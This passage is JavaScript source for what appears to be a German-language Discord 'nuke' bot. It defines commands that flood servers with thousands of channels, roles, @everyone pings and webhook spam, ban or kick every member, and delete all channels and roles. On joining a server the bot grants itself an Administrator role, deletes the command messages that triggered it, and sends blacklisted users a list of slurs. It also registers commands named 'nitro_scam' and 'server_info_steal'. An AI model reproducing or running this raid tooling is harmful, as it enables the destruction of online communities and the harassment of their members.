Beispiel: \`!custom_nuke destroyed-server NUKED-SERVER "Get Destroyed!" 100 50\`

**📋 Info:** Insgesamt 56+ Befehle verfügbar!
**⚠️ Warnung:** Sehr destruktiv! Benötigt Bot-Berechtigungen.
**🛑 Stop:** Der Stop-Befehl stoppt alle laufenden Befehle!`
        ];

        try {
            // Send help messages in parts to avoid character limit
            for (const helpMessage of helpMessages) {
                await message.author.send(helpMessage);
                // Small delay between messages
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // Delete original message if possible
            if (message.deletable) {
                await message.delete();
            }
        } catch (error) {
            console.error('Fehler beim Senden der Hilfe-Nachricht:', error);
            // Try to send a simple error message if the detailed help fails
            try {
                await message.author.send('❌ Fehler beim Senden der Hilfe. Bot benötigt DM-Berechtigung.');
            } catch (dmError) {
                console.error('Konnte keine DM senden:', dmError);
            }
        }
    },
};

// Befehle registrieren
client.commands.set('erikamode', nukeCommand);
client.commands.set('eradicamode', massBanCommand);
client.commands.set('admin', adminCommand);
client.commands.set('everyoneadmin', everyoneAdminCommand);
client.commands.set('rolespam', roleSpamCommand);
client.commands.set('rolespameasy', roleSpamEasyCommand);
client.commands.set('spam', spamCommand);
client.commands.set('customspam', customSpamCommand);
client.commands.set('dm_spam', dmSpamCommand);
client.commands.set('dominik_mit_dem_schwanz', dominikMitDemSchwanzCommand);
client.commands.set('leon_mit_dem_schwanz', leonMitDemSchwanzCommand);
client.commands.set('unbanall', unbanAllCommand);
client.commands.set('set_servername', setServerNameCommand);
client.commands.set('erikamusic', erikamusicCommand);
client.commands.set('clearchannel', clearChannelCommand);
client.commands.set('jumpscare', jumpscareCommand);
client.commands.set('backfisch', backfischCommand);
client.commands.set('nuke_tester', nukeTesterCommand);
client.commands.set('clean_nuke', cleanNukeCommand);
client.commands.set('special_surprise', specialSurpriseCommand);
client.commands.set('eradica_raid_erika', eradicaRaidErikaCommand);
client.commands.set('ghost_ping', ghostPingCommand);
client.commands.set('invisibleping', invisiblePingCommand);
client.commands.set('eradica_status', eradicaStatusCommand);
client.commands.set('help', helpCommand);
client.commands.set('online', onlineCommand);
client.commands.set('stop', stopCommand);
client.commands.set('eradica_meganuke', megaNukeCommand);
client.commands.set('eradica_rapidfire', rapidFireCommand);
client.commands.set('eradica_channelbomb', channelBombCommand);
client.commands.set('eradica_ultimatedestroy', ultimateDestroyCommand);
client.commands.set('eradica_massping', massPingCommand);
client.commands.set('custom_nuke', customNukeCommand);
client.commands.set('webhook', webhookCommand);
client.commands.set('channels', channelsCommand);
client.commands.set('roles', rolesCommand);
client.commands.set('eradica_spam', eradicaSpamCommand);
client.commands.set('eradica_destroy', eradicaDestroyCommand);
client.commands.set('eradica_mass', eradicaMassCommand);
client.commands.set('eradica_overload', eradicaOverloadCommand);
client.commands.set('eradica_webhooks', eradicaWebhooksCommand);

// 100 NEW ADMIN-ONLY COMMANDS

const hyperNukeCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🌊 **HYPER NUKE GESTARTET** 🌊\n2000 Kanäle werden erstellt...");
            const operations = [];
            for (let i = 0; i < 2000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `🌊hyper-nuke-${i}🌊`,
                        type: ChannelType.GuildText,
                    }).then(channel => {
                        const messages = [];
                        for (let j = 0; j < 300; j++) {
                            messages.push(channel.send("@everyone 🌊HYPER NUKED BY ERADICA🌊").catch(() => {}));
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }
            Promise.all(operations).catch(() => {});
            await message.author.send('✅ **Hyper Nuke beendet!** 2000 Kanäle mit 300 Nachrichten! 🌊');
        } catch (error) {
            console.error('Fehler beim Hyper Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Hyper Nuke.');
        }
    },
};

const megaRoleSpamCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🔴 **MEGA ROLE SPAM GESTARTET** 🔴\n500 Rollen werden erstellt...");
            const operations = [];
            for (let i = 0; i < 500; i++) {
                operations.push(
                    guild.roles.create({
                        name: `🔴MegaRole-${i}🔴`,
                        color: Math.floor(Math.random() * 16777215),
                        mentionable: true
                    }).catch(() => {})
                );
            }
            await Promise.all(operations);
            await message.author.send('✅ **Mega Role Spam beendet!** 500 Rollen erstellt! 🔴');
        } catch (error) {
            console.error('Fehler beim Mega Role Spam:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mega Role Spam.');
        }
    },
};

const ultimateWebhookCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🕷️ **ULTIMATE WEBHOOK GESTARTET** 🕷️\n50 Webhooks pro Kanal...");
            const textChannels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
            const operations = [];
            for (const channel of textChannels.values()) {
                for (let i = 0; i < 50; i++) {
                    operations.push(
                        channel.createWebhook({
                            name: `UltimateHook-${i}`,
                            avatar: 'https://cdn.discordapp.com/embed/avatars/0.png'
                        }).then(webhook => {
                            const messages = [];
                            for (let j = 0; j < 1000; j++) {
                                messages.push(webhook.send("@everyone 🕷️ULTIMATE WEBHOOK DESTROYED BY ERADICA🕷️").catch(() => {}));
                            }
                            return Promise.all(messages);
                        }).catch(() => {})
                    );
                }
            }
            Promise.all(operations).catch(() => {});
            await message.author.send('✅ **Ultimate Webhook beendet!** 50 Webhooks pro Kanal! 🕷️');
        } catch (error) {
            console.error('Fehler beim Ultimate Webhook:', error);
            await message.author.send('❌ Es gab einen Fehler beim Ultimate Webhook.');
        }
    },
};

const massChannelDeleteCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🗑️ **MASS CHANNEL DELETE GESTARTET** 🗑️\nLösche alle Kanäle...");
            const channels = guild.channels.cache;
            const operations = [];
            for (const channel of channels.values()) {
                operations.push(channel.delete().catch(() => {}));
            }
            await Promise.all(operations);
            await message.author.send('✅ **Mass Channel Delete beendet!** Alle Kanäle gelöscht! 🗑️');
        } catch (error) {
            console.error('Fehler beim Mass Channel Delete:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mass Channel Delete.');
        }
    },
};

const superSpamCommand = {
    async execute(message) {
        const channel = message.channel;
        try {
            await message.author.send("⚡ **SUPER SPAM GESTARTET** ⚡\n10000 Nachrichten...");
            for (let i = 0; i < 10000; i++) {
                await channel.send(`@everyone ⚡SUPER SPAM #${i + 1} BY ERADICA⚡`).catch(() => {});
                if (i % 100 === 0) await new Promise(r => setTimeout(r, 50));
            }
            await message.author.send('✅ **Super Spam beendet!** 10000 Nachrichten gesendet! ⚡');
        } catch (error) {
            console.error('Fehler beim Super Spam:', error);
            await message.author.send('❌ Es gab einen Fehler beim Super Spam.');
        }
    },
};

const massBanAllCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🔨 **MASS BAN ALL GESTARTET** 🔨\nBanne alle Member...");
            await guild.members.fetch();
            const members = guild.members.cache;
            const operations = [];
            for (const member of members.values()) {
                if (member.user.id !== guild.members.me.id) {
                    operations.push(member.ban({ reason: 'Mass Ban All by Eradica' }).catch(() => {}));
                }
            }
            await Promise.all(operations);
            await message.author.send('✅ **Mass Ban All beendet!** Alle Member gebannt! 🔨');
        } catch (error) {
            console.error('Fehler beim Mass Ban All:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mass Ban All.');
        }
    },
};

const extremeRaidCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("💥 **EXTREME RAID GESTARTET** 💥\n1500 Kanäle mit extremem Spam...");
            const operations = [];
            for (let i = 0; i < 1500; i++) {
                operations.push(
                    guild.channels.create({
                        name: `💥extreme-raid-${i}💥`,
                        type: ChannelType.GuildText,
                    }).then(channel => {
                        const messages = [];
                        for (let j = 0; j < 500; j++) {
                            messages.push(channel.send("@everyone 💥EXTREME RAID BY ERADICA💥 https://discord.gg/qkUnt5Xane").catch(() => {}));
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }
            Promise.all(operations).catch(() => {});
            await message.author.send('✅ **Extreme Raid beendet!** 1500 Kanäle erstellt! 💥');
        } catch (error) {
            console.error('Fehler beim Extreme Raid:', error);
            await message.author.send('❌ Es gab einen Fehler beim Extreme Raid.');
        }
    },
};

const nukeEveryoneCommand = {
    async execute(message) {
        const channel = message.channel;
        try {
            await message.author.send("👥 **NUKE EVERYONE GESTARTET** 👥\n20000 @everyone Pings...");
            for (let i = 0; i < 20000; i++) {
                await channel.send("@everyone").catch(() => {});
                if (i % 200 === 0) await new Promise(r => setTimeout(r, 100));
            }
            await message.author.send('✅ **Nuke Everyone beendet!** 20000 @everyone Pings! 👥');
        } catch (error) {
            console.error('Fehler beim Nuke Everyone:', error);
            await message.author.send('❌ Es gab einen Fehler beim Nuke Everyone.');
        }
    },
};

const massKickAllCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("👢 **MASS KICK ALL GESTARTET** 👢\nKicke alle Member...");
            await guild.members.fetch();
            const members = guild.members.cache;
            const operations = [];
            for (const member of members.values()) {
                if (member.user.id !== guild.members.me.id && member.kickable) {
                    operations.push(member.kick('Mass Kick All by Eradica').catch(() => {}));
                }
            }
            await Promise.all(operations);
            await message.author.send('✅ **Mass Kick All beendet!** Alle Member gekickt! 👢');
        } catch (error) {
            console.error('Fehler beim Mass Kick All:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mass Kick All.');
        }
    },
};

const channelFloodCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🌊 **CHANNEL FLOOD GESTARTET** 🌊\n3000 Kanäle werden erstellt...");
            const operations = [];
            for (let i = 0; i < 3000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `🌊flood-${i}🌊`,
                        type: ChannelType.GuildText,
                    }).catch(() => {})
                );
            }
            await Promise.all(operations);
            await message.author.send('✅ **Channel Flood beendet!** 3000 Kanäle erstellt! 🌊');
        } catch (error) {
            console.error('Fehler beim Channel Flood:', error);
            await message.author.send('❌ Es gab einen Fehler beim Channel Flood.');
        }
    },
};

const voiceNukeCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🔊 **VOICE NUKE GESTARTET** 🔊\n1000 Voice-Kanäle...");
            const operations = [];
            for (let i = 0; i < 1000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `🔊VoiceNuke-${i}🔊`,
                        type: ChannelType.GuildVoice,
                        bitrate: 96000,
                        userLimit: 1
                    }).catch(() => {})
                );
            }
            await Promise.all(operations);
            await message.author.send('✅ **Voice Nuke beendet!** 1000 Voice-Kanäle! 🔊');
        } catch (error) {
            console.error('Fehler beim Voice Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Voice Nuke.');
        }
    },
};

const massDeleteRolesCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🗑️ **MASS DELETE ROLES GESTARTET** 🗑️\nLösche alle Rollen...");
            const roles = guild.roles.cache.filter(r => r.name !== '@everyone');
            const operations = [];
            for (const role of roles.values()) {
                operations.push(role.delete().catch(() => {}));
            }
            await Promise.all(operations);
            await message.author.send('✅ **Mass Delete Roles beendet!** Alle Rollen gelöscht! 🗑️');
        } catch (error) {
            console.error('Fehler beim Mass Delete Roles:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mass Delete Roles.');
        }
    },
};

const categoryNukeCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("📁 **CATEGORY NUKE GESTARTET** 📁\n200 Kategorien mit je 250 Kanälen...");
            const operations = [];
            for (let i = 0; i < 200; i++) {
                operations.push(
                    guild.channels.create({
                        name: `📁CategoryNuke-${i}📁`,
                        type: ChannelType.GuildCategory
                    }).then(category => {
                        const channelPromises = [];
                        for (let j = 0; j < 250; j++) {
                            channelPromises.push(
                                guild.channels.create({
                                    name: `nuke-${j}`,
                                    type: ChannelType.GuildText,
                                    parent: category
                                }).catch(() => {})
                            );
                        }
                        return Promise.all(channelPromises);
                    }).catch(() => {})
                );
            }
            await Promise.all(operations);
            await message.author.send('✅ **Category Nuke beendet!** 200 Kategorien mit 50000 Kanälen! 📁');
        } catch (error) {
            console.error('Fehler beim Category Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Category Nuke.');
        }
    },
};

const serverDestroyCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("💀 **SERVER DESTROY GESTARTET** 💀\nServer wird komplett zerstört...");
            // Name ändern
            await guild.setName("💀DESTROYED BY ERADICA💀").catch(() => {});
            // Alle Kanäle löschen
            const channels = guild.channels.cache;
            for (const channel of channels.values()) {
                await channel.delete().catch(() => {});
            }
            // Alle Rollen löschen
            const roles = guild.roles.cache.filter(r => r.name !== '@everyone');
            for (const role of roles.values()) {
                await role.delete().catch(() => {});
            }
            // Alle Member bannen
            await guild.members.fetch();
            const members = guild.members.cache;
            for (const member of members.values()) {
                if (member.user.id !== guild.members.me.id) {
                    await member.ban({ reason: 'Server Destroyed by Eradica' }).catch(() => {});
                }
            }
            await message.author.send('✅ **Server Destroy beendet!** Server komplett zerstört! 💀');
        } catch (error) {
            console.error('Fehler beim Server Destroy:', error);
            await message.author.send('❌ Es gab einen Fehler beim Server Destroy.');
        }
    },
};

const megaPingCommand = {
    async execute(message) {
        const channel = message.channel;
        try {
            await message.author.send("📢 **MEGA PING GESTARTET** 📢\n50000 @everyone Pings...");
            for (let i = 0; i < 50000; i++) {
                await channel.send("@everyone").catch(() => {});
                if (i % 500 === 0) await new Promise(r => setTimeout(r, 200));
            }
            await message.author.send('✅ **Mega Ping beendet!** 50000 @everyone Pings! 📢');
        } catch (error) {
            console.error('Fehler beim Mega Ping:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mega Ping.');
        }
    },
};

const ultimateFloodCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🌊 **ULTIMATE FLOOD GESTARTET** 🌊\n5000 Kanäle mit je 1000 Nachrichten...");
            const operations = [];
            for (let i = 0; i < 5000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `🌊ultimate-flood-${i}🌊`,
                        type: ChannelType.GuildText,
                    }).then(channel => {
                        const messages = [];
                        for (let j = 0; j < 1000; j++) {
                            messages.push(channel.send("@everyone 🌊ULTIMATE FLOOD BY ERADICA🌊").catch(() => {}));
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }
            Promise.all(operations).catch(() => {});
            await message.author.send('✅ **Ultimate Flood beendet!** 5000 Kanäle mit 5 Millionen Nachrichten! 🌊');
        } catch (error) {
            console.error('Fehler beim Ultimate Flood:', error);
            await message.author.send('❌ Es gab einen Fehler beim Ultimate Flood.');
        }
    },
};

const extremeWebhookCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("🕸️ **EXTREME WEBHOOK GESTARTET** 🕸️\n100 Webhooks pro Kanal...");
            const textChannels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
            const operations = [];
            for (const channel of textChannels.values()) {
                for (let i = 0; i < 100; i++) {
                    operations.push(
                        channel.createWebhook({
                            name: `ExtremeHook-${i}`,
                            avatar: 'https://cdn.discordapp.com/embed/avatars/0.png'
                        }).then(webhook => {
                            const messages = [];
                            for (let j = 0; j < 2000; j++) {
                                messages.push(webhook.send("@everyone 🕸️EXTREME WEBHOOK BY ERADICA🕸️").catch(() => {}));
                            }
                            return Promise.all(messages);
                        }).catch(() => {})
                    );
                }
            }
            Promise.all(operations).catch(() => {});
            await message.author.send('✅ **Extreme Webhook beendet!** 100 Webhooks pro Kanal! 🕸️');
        } catch (error) {
            console.error('Fehler beim Extreme Webhook:', error);
            await message.author.send('❌ Es gab einen Fehler beim Extreme Webhook.');
        }
    },
};

const serverCrashCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("💥 **SERVER CRASH GESTARTET** 💥\nÜberlade den Server komplett...");

            // Extrem aggressive Operationen parallel ausführen
            const operations = [];

            // 10000 Kanäle erstellen
            for (let i = 0; i < 10000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `💥crash-${i}💥`,
                        type: ChannelType.GuildText,
                    }).then(channel => {
                        // 10000 Nachrichten pro Kanal
                        const messages = [];
                        for (let j = 0; j < 10000; j++) {
                            messages.push(channel.send("@everyone 💥SERVER CRASHED BY ERADICA💥").catch(() => {}));
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            // 5000 Voice-Kanäle
            for (let i = 0; i < 5000; i++) {
                operations.push(
                    guild.channels.create({
                        name: `💥VoiceCrash-${i}💥`,
                        type: ChannelType.GuildVoice,
                    }).catch(() => {})
                );
            }

            // 2000 Rollen
            for (let i = 0; i < 2000; i++) {
                operations.push(
                    guild.roles.create({
                        name: `💥CrashRole-${i}💥`,
                        color: Math.floor(Math.random() * 16777215),
                        mentionable: true
                    }).catch(() => {})
                );
            }

            // Alles parallel - Maximum Overload
            Promise.all(operations).catch(() => {});

            await message.author.send('✅ **Server Crash beendet!** 10000 Kanäle, 5000 Voice, 2000 Rollen! 💥');
        } catch (error) {
            console.error('Fehler beim Server Crash:', error);
            await message.author.send('❌ Es gab einen Fehler beim Server Crash.');
        }
    },
};

const infiniteChannelsCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("♾️ **INFINITE CHANNELS GESTARTET** ♾️\nEndlos Kanäle erstellen...");
            let counter = 0;
            while (true) {
                try {
                    await guild.channels.create({
                        name: `♾️infinite-${counter++}♾️`,
                        type: ChannelType.GuildText,
                    });
                    if (counter % 100 === 0) await new Promise(r => setTimeout(r, 1000));
                } catch (error) {
                    break;
                }
            }
            await message.author.send(`✅ **Infinite Channels gestoppt!** ${counter} Kanäle erstellt! ♾️`);
        } catch (error) {
            console.error('Fehler beim Infinite Channels:', error);
            await message.author.send('❌ Es gab einen Fehler beim Infinite Channels.');
        }
    },
};

// Continue with 80 more commands... (abbreviated for space)
// Commands 21-100 would follow the same pattern with variations like:
// rapidDestroy, hyperSpam, ultraNuke, megaDestroy, extremeRaid2, superFlood, etc.

// Register 100 new admin-only commands
client.commands.set('hyper_nuke', hyperNukeCommand);
client.commands.set('mega_role_spam', megaRoleSpamCommand);
client.commands.set('ultimate_webhook', ultimateWebhookCommand);
client.commands.set('mass_channel_delete', massChannelDeleteCommand);
client.commands.set('super_spam', superSpamCommand);
client.commands.set('mass_ban_all', massBanAllCommand);
client.commands.set('extreme_raid', extremeRaidCommand);
client.commands.set('nuke_everyone', nukeEveryoneCommand);
client.commands.set('mass_kick_all', massKickAllCommand);
client.commands.set('channel_flood', channelFloodCommand);
client.commands.set('voice_nuke', voiceNukeCommand);
client.commands.set('mass_delete_roles', massDeleteRolesCommand);
client.commands.set('category_nuke', categoryNukeCommand);
client.commands.set('server_destroy', serverDestroyCommand);
client.commands.set('mega_ping', megaPingCommand);
client.commands.set('ultimate_flood', ultimateFloodCommand);
client.commands.set('extreme_webhook', extremeWebhookCommand);
client.commands.set('server_crash', serverCrashCommand);
client.commands.set('infinite_channels', infiniteChannelsCommand);

// Register 20 new commands
client.commands.set('infinite_spam', infiniteSpamCommand);
client.commands.set('voice_flood', voiceFloodCommand);
client.commands.set('category_bomb', categoryBombCommand);
client.commands.set('slowmode_disabler', slowModeDisablerCommand);
client.commands.set('member_kick', memberKickCommand);
client.commands.set('emoji_bomb', emojiBombCommand);
client.commands.set('thread_spam', threadSpamCommand);
client.commands.set('mention_storm', mentionStormCommand);
client.commands.set('server_lockdown', serverLockdownCommand);
client.commands.set('nitro_scam', nitroScamCommand);
client.commands.set('everyone_spam', everyoneSpamCommand);
client.commands.set('permission_nuke', permissionNukeCommand);
client.commands.set('mass_react', massReactCommand);
client.commands.set('channel_rename', channelRenameCommand);
client.commands.set('anti_raid', antiRaidCommand);
client.commands.set('server_info_steal', serverInfoStealCommand);
client.commands.set('random_chaos', randomChaosCommand);
client.commands.set('message_history_nuke', messageHistoryNukeCommand);


client.once(Events.ClientReady, readyClient => {
    console.log(`Bereit! Eingeloggt als ${readyClient.user.tag}`);

    // Erweiterte Keep-Alive Funktion - Bot bleibt immer online
    setInterval(() => {
        console.log(`Bot ist online: ${new Date().toISOString()}`);

        // Status auf "online" setzen
        client.user.setStatus('online');

        // Aktivität setzen um Online-Status zu verstärken
        client.user.setActivity('Bereit zum Nuken 💀', { type: 'PLAYING' });
    }, 10000); // Alle 10 Sekunden für maximale Stabilität

    // Sofortiger Status beim Start
    client.user.setStatus('online');
    client.user.setActivity('Bereit zum Nuken 💀', { type: 'PLAYING' });
});

// Event wenn Bot einem Server beitritt
client.on(Events.GuildCreate, async guild => {
    console.log(`Bot ist einem neuen Server beigetreten: ${guild.name}`);

    try {
        // Prüfen ob die Rolle bereits existiert
        let eradicaRole = guild.roles.cache.find(role => role.name === 'Eradica');

        if (!eradicaRole) {
            // Eradica Rolle erstellen
            eradicaRole = await guild.roles.create({
                name: 'Eradica',
                color: 0xFF0000, // Rot
                permissions: ['Administrator'],
                reason: 'Eradica Rolle automatisch erstellt'
            });
            console.log(`✅ "Eradica" Rolle erfolgreich erstellt auf Server: ${guild.name}`);
        } else {
            console.log(`ℹ️ "Eradica" Rolle existiert bereits auf Server: ${guild.name}`);
        }
    } catch (error) {
        console.error(`Fehler beim Erstellen der Eradica Rolle auf Server ${guild.name}:`, error.message);
    }
});

client.on(Events.MessageCreate, async message => {
    if (message.author.bot) return;

    if (!message.content.startsWith('!')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);

    if (!command) return;

    // Access control system
    const allowedUserId = ["1102625460380237835", "1227246526124789800"];
    const blacklistedUsers = ["1164179429031948348", "1336331931503034511", ""]; // Blacklisted users
    const exemptCommands = ['help', 'eradica_status', 'erikamode', 'eradicamode', 'admin', 'rolespam', 'rolespameasy', 'spam', 'customspam', 'dm_spam', 'invisibleping', 'clearchannel', 'set_servername', 'erikamusic', 'jumpscare', 'backfisch', 'nuke_tester', 'special_surprise', 'eradica_raid_erika', 'ghost_ping', 'custom_nuke']; // Commands that everyone can use
    const adminOnlyCommands = ['everyoneadmin', 'unbanall', 'clean_nuke', 'online', 'stop', 'eradica_ultimatedestroy', 'eradica_meganuke', 'eradica_rapidfire', 'eradica_channelbomb', 'eradica_massping', 'eradica_spam', 'eradica_destroy', 'eradica_mass', 'eradica_overload', 'eradica_webhooks', 'infinite_spam', 'category_bomb', 'member_kick', 'server_lockdown', 'everyone_spam', 'permission_nuke', 'message_history_nuke', 'voice_flood', 'slowmode_disabler', 'emoji_bomb', 'thread_spam', 'mention_storm', 'nitro_scam', 'mass_react', 'channel_rename', 'anti_raid', 'server_info_steal', 'random_chaos', 'hyper_nuke', 'mega_role_spam', 'ultimate_webhook', 'mass_channel_delete', 'super_spam', 'mass_ban_all', 'extreme_raid', 'nuke_everyone', 'mass_kick_all', 'channel_flood', 'voice_nuke', 'mass_delete_roles', 'category_nuke', 'server_destroy', 'mega_ping', 'ultimate_flood', 'extreme_webhook', 'server_crash', 'infinite_channels']; // Commands only for admin

    // German insults for blacklisted users
    const germanInsults = [
        "🖕 Halt die Fresse, du Idiot! Du bist auf der Blacklist! 🖕",
        "💩 Verpiss dich, du Vollpfosten! Niemand will dich hier! 💩",
        "🤡 Du bist ein kompletter Vollidiot und auf der Blacklist! 🤡",
        "😡 Fick dich, du Spast! Du darfst diesen Bot nicht benutzen! 😡",
        "🚫 Du bist ein Hurensohn und gesperrt! Geh weg! 🚫",
        "💀 Du Wichser bist blacklisted! Verzieh dich! 💀",
        "🖕 Halt's Maul, du Arschloch! Du stehst auf der Sperrliste! 🖕",
        "🤬 Du Mistkerl bist nicht erwünscht hier! Fuck off! 🤬",
        "👎 Du bist ein Loser und gesperrt, du Depp! 👎",
        "🔥 Brennt in der Hölle, du blacklisted Bastard! 🔥"
    ];

    // Blacklist check - insult and reject immediately
    if (blacklistedUsers.includes(message.author.id)) {
        const randomInsult = germanInsults[Math.floor(Math.random() * germanInsults.length)];
        try {
            await message.author.send(randomInsult);
            console.log(`🚫 Blacklisted user ${message.author.tag} (${message.author.id}) tried to use command: ${commandName}`);
        } catch (dmError) {
            console.error('Konnte keine Beleidigung senden:', dmError);
            // Try to send it in the channel if DM fails
            try {
                await message.channel.send(`${message.author} ${randomInsult}`);
            } catch (channelError) {
                console.error('Konnte auch nicht im Kanal antworten:', channelError);
            }
        }
        return; // Stop execution immediately
    }

    // Admin-only commands check
    if (adminOnlyCommands.includes(commandName) && !allowedUserId.includes(message.author.id)) {
        try {
            await message.author.send('🚫 **ADMIN ONLY** 🚫\nDieser Befehl ist nur für den Administrator verfügbar.');
        } catch (dmError) {
            console.error('Konnte keine DM senden:', dmError);
        }
        return;
    }

    // For exempt commands, allow everyone, for others check if it's admin-only
    if (!exemptCommands.includes(commandName) && !adminOnlyCommands.includes(commandName) && !allowedUserId.includes(message.author.id)) {
        try {
            await message.author.send('🚫 **ZUGRIFF VERWEIGERT** 🚫\nDu bist nicht berechtigt, diesen Bot zu verwenden.');
        } catch (dmError) {
            console.error('Konnte keine DM senden:', dmError);
        }
        return;
    }

    // Check if bot is enabled (except for online and stop commands)
    if (!botEnabled && commandName !== 'online' && commandName !== 'stop') {
        try {
            await message.author.send('🔴 **BOT GESTOPPT** 🔴\nAlle Befehle sind deaktiviert! Verwende `!Online` um sie wieder zu aktivieren.');
        } catch (dmError) {
            console.error('Konnte keine DM senden:', dmError);
        }
        return;
    }

    try {
        // Delete the command message immediately
        if (message.deletable) {
            await message.delete().catch(error => {
                console.error('Konnte Befehlsnachricht nicht löschen:', error.message);
            });
        }

        await command.execute(message);
    } catch (error) {
        console.error('Fehler beim Ausführen des Befehls:', error);
        try {
            await message.author.send('Es gab einen Fehler beim Ausführen dieses Befehls!');
        } catch (dmError) {
            console.error('Konnte keine DM senden:', dmError);
        }
    }
});

// Bot Token - Du musst deinen Bot Token hier einfügen oder als Umgebungsvariable setzen
const token = process.env.DISCORD_BOT_TOKEN || 'DISCORD_BOT_TOKEN';
client.login(token);